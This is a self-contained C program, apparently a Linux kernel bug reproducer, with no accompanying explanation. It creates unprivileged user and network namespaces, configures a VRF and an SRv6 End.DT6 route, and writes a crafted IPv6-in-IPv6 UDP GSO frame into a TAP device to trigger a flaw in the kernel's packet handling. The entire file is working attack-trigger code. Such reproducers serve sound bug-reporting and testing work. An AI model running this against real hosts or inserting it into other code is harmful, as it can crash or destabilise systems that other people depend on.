// gcc -O2 -static -o repro repro.c
#define _GNU_SOURCE
#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/if.h>
#include <linux/if_ether.h>
#include <linux/if_link.h>
#include <linux/if_tun.h>
#include <linux/ipv6.h>
#include <linux/lwtunnel.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <linux/seg6_local.h>
#include <linux/udp.h>
#include <linux/virtio_net.h>
#include <sched.h>
#include <stddef.h>
#include <stdarg.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

#ifndef NLA_F_NESTED
#define NLA_F_NESTED (1U << 15)
#endif

#define VRF_NAME "vrf0"
#define TAP_NAME "tap0"
#define VRF_TABLE 100
#define UDP_PORT 5555
#define GSO_SIZE 1200
#define PAYLOAD_SIZE 2400

static unsigned int nl_seq;

static void die(const char *fmt, ...)
{
	va_list ap;

	va_start(ap, fmt);
	vfprintf(stderr, fmt, ap);
	va_end(ap);
	fprintf(stderr, ": %s\n", strerror(errno));
	exit(1);
}

static void write_file(const char *path, const char *value)
{
	int fd = open(path, O_WRONLY);
	ssize_t len = strlen(value);

	if (fd < 0)
		die("open %s", path);
	if (write(fd, value, len) != len)
		die("write %s", path);
	close(fd);
}

static void dump_file(const char *path)
{
	char buf[4096];
	ssize_t n;
	int fd = open(path, O_RDONLY);

	if (fd < 0) {
		fprintf(stderr, "cannot read %s: %s\n", path, strerror(errno));
		return;
	}
	fprintf(stderr, "--- %s ---\n", path);
	while ((n = read(fd, buf, sizeof(buf))) > 0)
		write(STDERR_FILENO, buf, n);
	close(fd);
}

static int open_rtnl(void)
{
	struct sockaddr_nl addr = { .nl_family = AF_NETLINK };
	int fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);

	if (fd < 0)
		die("socket NETLINK_ROUTE");
	if (bind(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0)
		die("bind NETLINK_ROUTE");
	return fd;
}

static void *nlmsg_tail(struct nlmsghdr *n)
{
	return (char *)n + NLMSG_ALIGN(n->nlmsg_len);
}

static void addattr(struct nlmsghdr *n, size_t maxlen, unsigned short type,
		    const void *data, size_t len)
{
	struct rtattr *rta;
	size_t alen = RTA_LENGTH(len);
	size_t newlen = NLMSG_ALIGN(n->nlmsg_len) + RTA_ALIGN(alen);

	if (newlen > maxlen) {
		errno = EMSGSIZE;
		die("netlink message overflow");
	}
	rta = nlmsg_tail(n);
	rta->rta_type = type;
	rta->rta_len = alen;
	if (len)
		memcpy(RTA_DATA(rta), data, len);
	n->nlmsg_len = newlen;
}

static struct rtattr *nest_start(struct nlmsghdr *n, size_t maxlen,
				 unsigned short type)
{
	struct rtattr *nest = nlmsg_tail(n);

	addattr(n, maxlen, type | NLA_F_NESTED, NULL, 0);
	return nest;
}

static void nest_end(struct nlmsghdr *n, struct rtattr *nest)
{
	nest->rta_len = (char *)nlmsg_tail(n) - (char *)nest;
}

static void nl_ack(int fd, struct nlmsghdr *n, const char *what)
{
	struct sockaddr_nl addr = { .nl_family = AF_NETLINK };
	char buf[8192];
	struct iovec iov = { .iov_base = n, .iov_len = n->nlmsg_len };
	struct msghdr msg = {
		.msg_name = &addr,
		.msg_namelen = sizeof(addr),
		.msg_iov = &iov,
		.msg_iovlen = 1,
	};
	ssize_t ret;

	n->nlmsg_seq = ++nl_seq;
	if (sendmsg(fd, &msg, 0) < 0)
		die("sendmsg %s", what);

	for (;;) {
		struct nlmsghdr *h;

		ret = recv(fd, buf, sizeof(buf), 0);
		if (ret < 0)
			die("recv %s", what);
		for (h = (struct nlmsghdr *)buf; NLMSG_OK(h, ret);
		     h = NLMSG_NEXT(h, ret)) {
			struct nlmsgerr *e;

			if (h->nlmsg_seq != n->nlmsg_seq)
				continue;
			if (h->nlmsg_type != NLMSG_ERROR)
				continue;
			e = NLMSG_DATA(h);
			if (!e->error)
				return;
			errno = -e->error;
			die("netlink %s", what);
		}
	}
}

static void create_vrf(int nl)
{
	struct {
		struct nlmsghdr n;
		struct ifinfomsg i;
		char attrs[1024];
	} req = { 0 };
	struct rtattr *linkinfo, *infodata;
	uint32_t table = VRF_TABLE;

	req.n.nlmsg_len = NLMSG_LENGTH(sizeof(req.i));
	req.n.nlmsg_type = RTM_NEWLINK;
	req.n.nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK |
				NLM_F_CREATE | NLM_F_EXCL;
	req.i.ifi_family = AF_UNSPEC;
	addattr(&req.n, sizeof(req), IFLA_IFNAME, VRF_NAME,
		strlen(VRF_NAME) + 1);
	linkinfo = nest_start(&req.n, sizeof(req), IFLA_LINKINFO);
	addattr(&req.n, sizeof(req), IFLA_INFO_KIND, "vrf", 4);
	infodata = nest_start(&req.n, sizeof(req), IFLA_INFO_DATA);
	addattr(&req.n, sizeof(req), IFLA_VRF_TABLE, &table, sizeof(table));
	nest_end(&req.n, infodata);
	nest_end(&req.n, linkinfo);
	nl_ack(nl, &req.n, "create VRF");
}

static void link_up(int nl, int ifindex, const char *name)
{
	struct {
		struct nlmsghdr n;
		struct ifinfomsg i;
	} req = { 0 };

	req.n.nlmsg_len = NLMSG_LENGTH(sizeof(req.i));
	req.n.nlmsg_type = RTM_NEWLINK;
	req.n.nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
	req.i.ifi_family = AF_UNSPEC;
	req.i.ifi_index = ifindex;
	req.i.ifi_flags = IFF_UP;
	req.i.ifi_change = IFF_UP;
	nl_ack(nl, &req.n, name);
}

static void add_route(int nl, const struct in6_addr *dst, uint8_t table,
		      uint8_t type, uint8_t scope, int oif, bool end_dt6)
{
	struct {
		struct nlmsghdr n;
		struct rtmsg r;
		char attrs[1024];
	} req = { 0 };

	req.n.nlmsg_len = NLMSG_LENGTH(sizeof(req.r));
	req.n.nlmsg_type = RTM_NEWROUTE;
	req.n.nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK |
				NLM_F_CREATE | NLM_F_EXCL;
	req.r.rtm_family = AF_INET6;
	req.r.rtm_dst_len = 128;
	req.r.rtm_table = table;
	req.r.rtm_protocol = RTPROT_STATIC;
	req.r.rtm_scope = scope;
	req.r.rtm_type = type;
	addattr(&req.n, sizeof(req), RTA_DST, dst, sizeof(*dst));
	addattr(&req.n, sizeof(req), RTA_OIF, &oif, sizeof(oif));

	if (end_dt6) {
		struct rtattr *encap;
		uint16_t encap_type = LWTUNNEL_ENCAP_SEG6_LOCAL;
		uint32_t action = SEG6_LOCAL_ACTION_END_DT6;
		uint32_t vrftable = VRF_TABLE;

		addattr(&req.n, sizeof(req), RTA_ENCAP_TYPE, &encap_type,
			sizeof(encap_type));
		encap = nest_start(&req.n, sizeof(req), RTA_ENCAP);
		addattr(&req.n, sizeof(req), SEG6_LOCAL_ACTION, &action,
			sizeof(action));
		addattr(&req.n, sizeof(req), SEG6_LOCAL_VRFTABLE, &vrftable,
			sizeof(vrftable));
		nest_end(&req.n, encap);
	}

	nl_ack(nl, &req.n, end_dt6 ? "add End.DT6 route" :
					 "add inner local route");
}

static int create_tap(int fd)
{
	struct ifreq ifr = { 0 };
	unsigned int offloads = TUN_F_CSUM | TUN_F_USO4 | TUN_F_USO6;

	strncpy(ifr.ifr_name, TAP_NAME, IFNAMSIZ - 1);
	ifr.ifr_flags = IFF_TAP | IFF_NO_PI | IFF_VNET_HDR;
	if (ioctl(fd, TUNSETIFF, &ifr) < 0)
		die("TUNSETIFF");
	if (ioctl(fd, TUNSETOFFLOAD, offloads) < 0)
		die("TUNSETOFFLOAD");
	return fd;
}

static int get_ifindex(const char *name)
{
	struct ifreq ifr = { 0 };
	int fd = socket(AF_INET, SOCK_DGRAM, 0);
	int ifindex;

	if (fd < 0)
		die("socket for SIOCGIFINDEX");
	strncpy(ifr.ifr_name, name, IFNAMSIZ - 1);
	if (ioctl(fd, SIOCGIFINDEX, &ifr) < 0)
		die("SIOCGIFINDEX");
	ifindex = ifr.ifr_ifindex;
	close(fd);
	return ifindex;
}

static void get_mac(const char *name, unsigned char mac[ETH_ALEN])
{
	struct ifreq ifr = { 0 };
	int fd = socket(AF_INET, SOCK_DGRAM, 0);

	if (fd < 0)
		die("socket for SIOCGIFHWADDR");
	strncpy(ifr.ifr_name, name, IFNAMSIZ - 1);
	if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0)
		die("SIOCGIFHWADDR");
	memcpy(mac, ifr.ifr_hwaddr.sa_data, ETH_ALEN);
	close(fd);
}

static uint16_t udp6_partial_seed(const struct in6_addr *src,
				  const struct in6_addr *dst, uint32_t len)
{
	const unsigned char *s = (const unsigned char *)src;
	const unsigned char *d = (const unsigned char *)dst;
	uint32_t sum = 0;
	int i;

	for (i = 0; i < 16; i += 2) {
		sum += ((uint32_t)s[i] << 8) | s[i + 1];
		sum += ((uint32_t)d[i] << 8) | d[i + 1];
	}
	sum += len >> 16;
	sum += len & 0xffff;
	sum += IPPROTO_UDP;
	while (sum >> 16)
		sum = (sum & 0xffff) + (sum >> 16);
	return htons((uint16_t)sum);
}

static int make_listener(void)
{
	struct sockaddr_in6 addr = {
		.sin6_family = AF_INET6,
		.sin6_port = htons(UDP_PORT),
		.sin6_addr = IN6ADDR_ANY_INIT,
	};
	int one = 1;
	int fd = socket(AF_INET6, SOCK_DGRAM, 0);

	if (fd < 0)
		die("socket UDP listener");
	if (setsockopt(fd, SOL_SOCKET, SO_BINDTODEVICE, VRF_NAME,
		       strlen(VRF_NAME) + 1) < 0)
		die("SO_BINDTODEVICE");
	if (setsockopt(fd, IPPROTO_UDP, UDP_NO_CHECK6_RX, &one,
		       sizeof(one)) < 0)
		die("UDP_NO_CHECK6_RX");
	if (bind(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0)
		die("bind UDP listener");
	return fd;
}

static void inject_gso(int tap, const unsigned char dst_mac[ETH_ALEN],
		       const struct in6_addr *sid,
		       const struct in6_addr *inner_dst)
{
	const size_t packet_len = sizeof(struct virtio_net_hdr) + ETH_HLEN +
		2 * sizeof(struct ipv6hdr) + sizeof(struct udphdr) + PAYLOAD_SIZE;
	unsigned char *buf = calloc(1, packet_len);
	struct virtio_net_hdr *vh;
	struct ethhdr *eth;
	struct ipv6hdr *outer, *inner;
	struct udphdr *udp;
	unsigned char *payload;
	struct in6_addr outer_src, inner_src;
	ssize_t ret;

	if (!buf)
		die("calloc packet");
	inet_pton(AF_INET6, "2001:db8::2", &outer_src);
	inet_pton(AF_INET6, "2001:db8:1::2", &inner_src);

	vh = (struct virtio_net_hdr *)buf;
	vh->flags = VIRTIO_NET_HDR_F_NEEDS_CSUM;
	vh->gso_type = VIRTIO_NET_HDR_GSO_UDP_L4;
	vh->hdr_len = ETH_HLEN + 2 * sizeof(struct ipv6hdr) +
		       sizeof(struct udphdr);
	vh->gso_size = GSO_SIZE;
	vh->csum_start = ETH_HLEN + 2 * sizeof(struct ipv6hdr);
	vh->csum_offset = offsetof(struct udphdr, check);

	eth = (struct ethhdr *)(vh + 1);
	memcpy(eth->h_dest, dst_mac, ETH_ALEN);
	eth->h_source[0] = 0x02;
	eth->h_source[5] = 0x42;
	eth->h_proto = htons(ETH_P_IPV6);

	outer = (struct ipv6hdr *)(eth + 1);
	outer->version = 6;
	outer->payload_len = htons(sizeof(struct ipv6hdr) +
				  sizeof(struct udphdr) + PAYLOAD_SIZE);
	outer->nexthdr = IPPROTO_IPV6;
	outer->hop_limit = 64;
	outer->saddr = outer_src;
	outer->daddr = *sid;

	inner = outer + 1;
	inner->version = 6;
	inner->payload_len = htons(sizeof(struct udphdr) + PAYLOAD_SIZE);
	inner->nexthdr = IPPROTO_UDP;
	inner->hop_limit = 64;
	inner->saddr = inner_src;
	inner->daddr = *inner_dst;

	udp = (struct udphdr *)(inner + 1);
	udp->source = htons(4444);
	udp->dest = htons(UDP_PORT);
	udp->len = htons(sizeof(*udp) + PAYLOAD_SIZE);

	udp->check = 0;
	payload = (unsigned char *)(udp + 1);
	memset(payload, 0x41, PAYLOAD_SIZE);

	fprintf(stderr, "injecting IPv6-in-IPv6 UDP_L4 GSO frame (%zu bytes)\n",
		packet_len);
	ret = write(tap, buf, packet_len);
	if (ret < 0)
		die("write TAP GSO frame");
	if ((size_t)ret != packet_len) {
		errno = EIO;
		die("short TAP write");
	}
	free(buf);
}

int main(void)
{
	struct in6_addr sid, inner_dst;
	unsigned char tap_mac[ETH_ALEN];
	int nl, tap, vrf_ifindex, tap_ifindex, listener;

	setbuf(stdout, NULL);
	setbuf(stderr, NULL);

	if (geteuid() == 0) {

		if (chmod("/dev/net/tun", 0666) < 0)
			die("chmod /dev/net/tun before dropping privilege");
		if (setresgid(65534, 65534, 65534) ||
		    setresuid(65534, 65534, 65534))
			die("drop to uid/gid 65534");
	}
	if (unshare(CLONE_NEWUSER | CLONE_NEWNET) < 0)
		die("unshare user+net namespaces");
	fprintf(stderr, "running in owned user/net namespaces (outer uid=%d)\n",
		getuid());
	tap = open("/dev/net/tun", O_RDWR);
	if (tap < 0)
		die("open /dev/net/tun in owned netns");

	nl = open_rtnl();
	create_vrf(nl);
	vrf_ifindex = get_ifindex(VRF_NAME);
	if (!vrf_ifindex)
		die("if_nametoindex vrf0");
	link_up(nl, vrf_ifindex, "bring VRF up");
	write_file("/proc/sys/net/vrf/strict_mode", "1\n");
	write_file("/proc/sys/net/ipv6/conf/all/forwarding", "1\n");

	create_tap(tap);
	tap_ifindex = get_ifindex(TAP_NAME);
	if (!tap_ifindex)
		die("if_nametoindex tap0");
	link_up(nl, tap_ifindex, "bring TAP up");
	get_mac(TAP_NAME, tap_mac);

	if (inet_pton(AF_INET6, "fc00::1", &sid) != 1 ||
	    inet_pton(AF_INET6, "2001:db8:1::1", &inner_dst) != 1)
		die("inet_pton");
	add_route(nl, &sid, RT_TABLE_MAIN, RTN_UNICAST,
		  RT_SCOPE_UNIVERSE, vrf_ifindex, true);
	add_route(nl, &inner_dst, VRF_TABLE, RTN_LOCAL,
		  RT_SCOPE_HOST, vrf_ifindex, false);

	listener = make_listener();
	fprintf(stderr, "configured End.DT6 and normal UDP listener; no VRF tap\n");
	inject_gso(tap, tap_mac, &sid, &inner_dst);

	fprintf(stderr, "frame accepted without immediate crash; waiting\n");
	sleep(1);
	{
		char b[4096];
		ssize_t n = recv(listener, b, sizeof(b), MSG_DONTWAIT);
		fprintf(stderr, "listener recv=%zd errno=%d (%s)\n", n, errno,
			strerror(errno));
	}
	dump_file("/proc/net/snmp6");
	dump_file("/proc/net/dev");
	close(listener);
	close(tap);
	close(nl);
	return 2;
}
